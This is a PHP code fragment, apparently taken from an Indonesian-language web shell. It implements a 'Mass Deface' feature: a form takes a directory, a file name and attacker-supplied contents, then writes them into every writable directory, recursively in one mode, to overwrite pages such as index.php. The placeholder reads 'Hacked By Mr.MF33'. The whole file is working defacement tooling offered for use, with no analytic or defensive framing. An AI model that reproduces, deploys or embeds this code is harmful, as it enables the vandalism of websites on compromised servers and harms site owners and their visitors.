<?php 

  /*
    Mass Deface
*/
        if ($_GET['aksi'] == 'massdeface') {

            function tipe_massal($dir, $namafile, $isi_script)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            file_put_contents($lokasi, $isi_script);
                        } elseif ($dirb === '..') {
                            file_put_contents($lokasi, $isi_script);
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    echo "Berhasil => $lokasi\n";
                                    file_put_contents($lokasi, $isi_script);
                                    $MassDeface = tipe_massal($dirc, $namafile, $isi_script);
                                }
                            }
                        }
                    }
                }
            }

            function tipe_biasa($dir, $namafile, $isi_script)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            file_put_contents($lokasi, $isi_script);
                        } elseif ($dirb === '..') {
                            file_put_contents($lokasi, $isi_script);
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    echo "Berhasil => $dirb/$namafile\n";
                                    file_put_contents($lokasi, $isi_script);
                                }
                            }
                        }
                    }
                }
            }

            if ($_POST['start']) {

                echo "<textarea class='form-control' rows='8' disabled='disabled'>";
                if ($_POST['tipe'] == 'mahal') {
                    tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                } elseif ($_POST['tipe'] == 'murah') {
                    tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                }
                echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
            } else {
                echo "<form method='post'>
            <center>
                <p>{ Mass Deface }</p>
                <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
                <label for='toggle-on' class='butn'>Biasa</label>
                <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
                <label for='toggle-off' class='butn'>Masal</label>
            </center><hr>
            <p><i class='fa fa-folder'></i> Lokasi</p>
            <input type='text' name='d_dir' value='$dir' class='form-control'><br>
            <p><i class ='fa fa-file'></i> Nama File</p>
            <input type='text' name='d_file' placeholder='index.php' class='form-control'><br/>
            <p><i class ='fa fa-file'></i> Isi File</p>
            <textarea name='script' class='form-control' rows='5' placeholder='Hacked By Mr.MF33'></textarea><br/>
            <input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
            <br><br>
            </form>";
            }
        }

?>
